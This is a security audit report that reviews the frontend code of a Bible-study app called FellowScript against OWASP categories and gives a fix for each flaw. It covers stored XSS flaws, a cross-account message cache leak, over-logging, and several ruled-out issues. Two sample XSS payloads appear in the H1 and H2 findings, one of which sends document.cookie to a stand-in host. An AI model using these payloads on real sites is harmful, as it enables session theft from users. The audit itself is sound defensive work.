# OWASP Compliance Review — 20260904-frontend-arch-sweep

Scope: the three frontend surfaces enumerated in `file-inventory.json` / `compliance-plan.md` — the
iOS SwiftUI app (`FellowScript/FellowScript/`, 46 files), the React/Vite SPA (`frontend/src/`, 94
files), and the legacy static tree (`frontend/{account,reader,signin}.html`, `frontend/css/`,
`frontend/js/`, 21 files). Backend `api/` is out of scope per the plan; where a finding's full
exploitability depends on backend behavior, that is called out explicitly rather than asserted.

Reviewed against OWASP Top 10:2025, ASVS 5.0, and (where relevant) the LLM/Agentic checklists —
grounded in the `owasp-security` skill. Every finding below was traced to a concrete code path, not
just a keyword hit; several suspected issues (e.g. `NetworkService.swift`'s unchecked `requestRaw`
calls on `/login`/`/signup`/MFA) were investigated and found to already fail closed via a
decode-shape guard, so they are not listed as findings.

---

## Critical

None found.

---

## High

### H1 — Stored XSS: note-HTML sanitizer can be bypassed via nested disallowed tags
**File:** `frontend/src/components/RichText.jsx:63-113` (`cleanNode`, `sanitizeNoteHtml`), rendered via `NoteBody` (same file, ~L226-239) and consumed by `frontend/src/components/panels/NotesPanel.jsx:106-111,177`
**Category:** OWASP A05:2025 Injection (stored XSS / improper output sanitization); ASVS 5.0 1.2.1 (output encoding)

`cleanNode(node)` snapshots `node.childNodes` once at the top of the function (`const children = [...node.childNodes]`) and only recurses into children whose tag is in `ALLOWED_TAGS` (line 100, `cleanNode(child)`). For a **disallowed** tag, it "unwraps" it — moves the disallowed element's own children up to become new siblings under `node` (`node.replaceChild(frag, child)`) — but those newly-promoted nodes were never part of the original `children` snapshot, so they are never visited again, by this call or any other. Their attributes are never stripped and their own children are never recursively cleaned.

Concretely, a note body of:
```html
<object><b onclick="fetch('https://evil.example/x?c='+document.cookie)">click</b></object>
```
sanitizes to `<b onclick="...">click</b>` — `OBJECT` (disallowed) is unwrapped, but the promoted `<b>` (allowed) skips the attribute-stripping step that would normally strip `onclick` (that step only runs for elements found in the *original* per-call snapshot). The resulting HTML is then assigned via `dangerouslySetInnerHTML` in `NoteBody`, creating a live `<b onclick=…>` element whose inline handler executes normally on click (unlike a `<script>` tag, inline event-handler attributes inserted via `innerHTML`/`dangerouslySetInnerHTML` do execute).

**Exploit scenario:** `NotesPanel.jsx`'s own comment acknowledges the trust boundary this sanitizer exists to defend: *"note.text can contain attacker-influenceable HTML (e.g. group-shared notes, AI-summarized content)."* A group member (or anyone able to reach `POST/PUT /notes/{user_id}` directly, bypassing the contentEditable UI, since the UI is not the enforcement point) can craft a note whose `text` contains the payload above and share it into a group. Any other group member who opens that note triggers the `onclick` (or `onmouseover`, `onerror` via other allowed-tag/wrapper combinations) the moment they interact with it, running arbitrary JS in their authenticated session — able to read `localStorage`/`sessionStorage` (`fs_user`, the cached user object), issue authenticated fetches to any endpoint using the same-origin cookie, or exfiltrate data.

**Fix:** Re-scan promoted/unwrapped nodes recursively (e.g. re-run the disallowed-tag branch's output through `cleanNode` again, or restructure as a single recursive walk using `TreeWalker`/`createTreeWalker` that visits every node exactly once regardless of ancestor mutation), and add a regression test that nests an event-handler-bearing allowed tag inside a disallowed wrapper (mirroring the existing `NotesPanel.test.jsx` XSS suite, which currently only tests `<img onerror>` and `<script>` at the top level, not the nested-unwrap case).

---

### H2 — Stored XSS: group-member usernames rendered unescaped into `innerHTML` (legacy notes filter)
**File:** `frontend/js/notes.js:71-78` (`_syncFilterInput`)
**Category:** OWASP A05:2025 Injection (stored XSS)

```js
if (type === 'user') {
  const names = Object.keys(groupNotes);
  ...
  userList.innerHTML = names
    .map(n => `<label class="filter-radio-row">
      <input type="radio" name="fs-user" value="${n}" />
      <span>${n}</span>
    </label>`)
    .join('');
```
`groupNotes` is populated straight from the server's `GET /groups/{user_id}/{groupId}/notes` response (`_loadGroupNotes`, `notes.js:361-374`), keyed by each group member's **username**. This is the only `innerHTML` assignment in the legacy static tree that skips `escHtml()` — every other render path in this same file (`_noteCardHTML`, `openNoteDetail`, `_loadDetailReplies`) and in the sibling files (`dashboard.js`, `messaging.js`) escapes user-controlled strings before interpolating them into HTML, confirming this is an isolated lapse rather than the pattern.

**Exploit scenario:** any account whose username contains HTML/JS (e.g. `<img src=x onerror=alert(document.cookie)>` — nothing in the client visibly validates username charset beyond whatever the signup form/backend enforce) joins a shared study group. The moment any other member of that group opens the notes sidebar's filter panel and selects "Filter by user," the malicious username is parsed as live HTML and executes in that member's browser, on the legacy static Reader page that this sweep's plan flags as having **zero automated test coverage** to catch this class of regression.

**Fix:** wrap `n` in `escHtml(n)` for both the `value` and the visible `<span>`, matching every other render site in the file.

---

### H3 — Cross-account DM cache leak: `DiskCache` key for friend messages omits the signed-in user id
**File:** `FellowScript/FellowScript/Chat/ChatThreadView.swift:81,96` (`ChatThreadViewModel.load`)
**Category:** OWASP A01:2025 Broken Access Control (data isolation failure / CWE-668 exposure to wrong sphere)

```swift
static func roomKey(contact: FSContact, userId: String) -> String {
    if contact.type == .friend {
        return [userId, contact.id].sorted().joined(separator: "|")
    }
    return contact.id
}

func load(service: DataServiceProtocol, contact: FSContact, userId: String) async {
    let sessionKey = Self.roomKey(contact: contact, userId: userId)
    if let cached: [FSMessage] = await DiskCache.shared.load([FSMessage].self, forKey: "messages:\(contact.id)") { ... }
    ...
    await DiskCache.shared.save(messages, forKey: "messages:\(contact.id)")
    await DiskCache.shared.save(sessions, forKey: "sessions:\(sessionKey)")
```
The `"messages:\(contact.id)"` cache key uses only the **contact's** id, never the current `userId`. `DiskCache.swift`'s own header comment states the invariant this violates: *"Keys should be namespaced by user id so one account never sees another's cached data."* Every other `DiskCache.shared` call site in the codebase (`ChatRootView.swift`, `DashboardView.swift`, `NotesListView.swift`) does include `userId` in the key (`"friends:\(userId)"`, `"notes:\(userId)"`, etc.) — this is the one call site that doesn't, and it's confirmed as an oversight rather than intentional by the adjacent `sessions:\(sessionKey)` line right below it, which *does* fold `userId` into its key via `roomKey`.

**Exploit scenario:** for a friend DM, `contact.id` is the friend's user id — the same value no matter which local account opens that conversation. On a shared/multi-user device (family iPad, shared account handoff — plausible for this app's group/study-partner use case), if Account A signs out and Account B signs in, and both A and B have a mutual friend C, opening the DM with C under Account B immediately displays (`messages = cached`, line 82) Account A's previously cached private message history with C, before the fresh network fetch overwrites it. This is a real, unencrypted-at-rest disclosure of one account's private conversation content to a different account on the same device.

**Fix:** key friend-DM message caches by `sessionKey` (which already correctly sorts-and-joins `[userId, contact.id]`) instead of bare `contact.id`, consistent with how `sessions:` is already keyed on the very next line.

---

## Medium

### M1 — Full note content logged to console/stdout in every environment
**Files:** `frontend/js/notes.js:356,371`; `FellowScript/FellowScript/Notes/NotesListView.swift:370`
**Category:** OWASP A09:2025 Security Logging and Alerting Failures / sensitive-data exposure. Per this project's Security Q13 policy ("proactively scrub/redact anything potentially sensitive from logs in every environment... this is now an autonomous-fix-worthy finding"), this is flagged as fix-worthy rather than merely observational.

```js
console.log('[notes] personal notes loaded:', Object.keys(allNotes).length, allNotes);
console.log(`[notes] group ${groupId} loaded: ${total} notes across`, Object.keys(data).length, 'users', data);
```
and
```swift
print("[VM] saveNote called — editingId=\(editingId ?? "nil") text.count=\(note.text.count) text.prefix=\(note.text.prefix(60))")
```
These log the full decoded note payload (titles, verse-study text, group note bodies — user-authored content that can be personal/PII-adjacent) unconditionally, regardless of build configuration. `notes.js`'s two lines dump the *entire* notes object tree, not just counts.

**Fix:** drop the payload argument from both `console.log` calls (keep only the counts already being logged), and truncate/remove the `text.prefix(60)` interpolation in `NotesListView.swift`'s debug print (or gate behind a debug-only compile flag if the trace is still needed for triage).

### M2 — Client-wide authorization model rests entirely on client-supplied `user_id`, unverifiable in this sweep
**Files (representative, not exhaustive):** `frontend/js/session.js:29-38` (`validateSession`), `frontend/js/notes.js`/`messaging.js`/`highlights.js` (every `fetch` call), `frontend/src/hooks/useNotes.js`/`useMessaging.js`/`useSessions.js`/`useAgentChat.js`, `FellowScript/FellowScript/Services/NetworkService.swift` (nearly every method)
**Category:** OWASP A01:2025 Broken Access Control — flagged forward, not confirmed, since `api/` is out of scope for this sweep

All three surfaces uniformly identify "whose data" a request is about by embedding a client-held `user_id` into the URL path or body (e.g. `GET /notes/{user_id}`, `GET /session/{userId}`, `GET /user/{fid}`) rather than deriving identity purely from the session cookie/token presented alongside it. This is not, by itself, a client-side defect — a client has to name the resource somehow, and `AuthContext.jsx`'s comment confirms the actual session is an httponly cookie the client can't read or forge. But it does mean the *entire* authorization boundary for every one of these endpoints depends on the (out-of-scope) backend independently re-deriving the caller's identity from that cookie and rejecting any request where the path/body `user_id` doesn't match — a single endpoint that skips that cross-check would be a direct IDOR reachable from every call site listed above. Recommend this be confirmed against `api/backend/auth/dependencies.py` and each router as a fast-follow, since it's the load-bearing assumption underneath all three frontend surfaces' data access.

---

## Low

### L1 — `DiskCache` persists PII-adjacent data to disk with no explicit file-protection class
**File:** `FellowScript/FellowScript/Services/DiskCache.swift:18-63`
**Category:** OWASP A04:2025 Cryptographic Failures (data-at-rest protection)

`DiskCache` writes notes, messages, account info, and dashboard data (per its own header comment) to `Library/Caches` via plain `Data.write(to:options:.atomic)`, relying solely on the OS default file-protection class rather than explicitly opting into `.completeUntilFirstUserAuthentication` (or stronger) via `FileManager` attributes. Severity is Low because the app sandbox and default APFS-level protection already bound exposure to on-device/jailbreak scenarios (not remote), and this doesn't change the H3 finding above (H3 is a same-device key-collision issue, independent of encryption-at-rest).

**Fix:** set an explicit `NSFileProtectionKey` (e.g. `.completeUntilFirstUserAuthentication`) when writing cache files, given the cached content includes private notes and message history.

---

## Notes on findings investigated and ruled out

- **`NetworkService.swift`'s `requestRaw` (unchecked HTTP status) on `/login`, `/signup`, `/auth/google`, `/auth/apple`, `/auth/mfa/verify-login`, `/auth/password-reset/request`:** traced each call site — every auth-flow caller guards on `decode(FSUser.self, from: data)` succeeding and throws `AppError.authFailed(...)` on failure (lines 208-211, 218-221, 227-230, 240-243, 267-270). A generic `{"detail": "..."}` error body can't satisfy `FSUser`'s required fields, so this fails closed despite skipping `throwIfError`. Not a finding.
- **`StoreKitManager.swift`'s `checkVerified`:** fails closed on `.unverified` StoreKit transactions (throws `StoreError.failedVerification`); entitlement sync failures are surfaced via `lastError`, not silently dropped. Not a finding.
- **`AdminGate.jsx` / `/admin` routes in `App.jsx`:** client-side gate is explicitly and correctly documented as UX-only defense-in-depth; both admin pages perform their own fetch-driven authorization check as the real client-side gate, with `require_admin` as the actual server-side boundary. Consistent with this project's stated secure-defaults posture. Not a finding.
- **Legacy tree (`messaging.js`, `dashboard.js`) and React (`ChatThread.jsx`, no `dangerouslySetInnerHTML` found) message/contact rendering:** all confirmed to consistently `escHtml()` user-controlled strings (names, previews, message text) before interpolating into `innerHTML`, unlike the isolated H2 lapse.
- **No hardcoded secrets, API keys, or credentials** found in client-shipped source across any of the three surfaces (`frontend/js/config.js`, `frontend/src/config.js`, Swift `Services/`) — `config.js` files carry only the public API base URL, an accepted deployment value per this project's Configuration Q2 policy. `GoogleAuthSession.swift`'s hardcoded OAuth `clientID` is a public identifier by design (native OAuth clients have no client secret; PKCE carries the proof), not a secret leak.
- **Attachment upload flow (`useMessaging.js` S3 presigned POST, `MessageAttachments.swift`'s SwiftUI `Image`/`AsyncImage`):** file bytes never pass through this app's own API/DOM rendering path in a way that could execute; no finding.
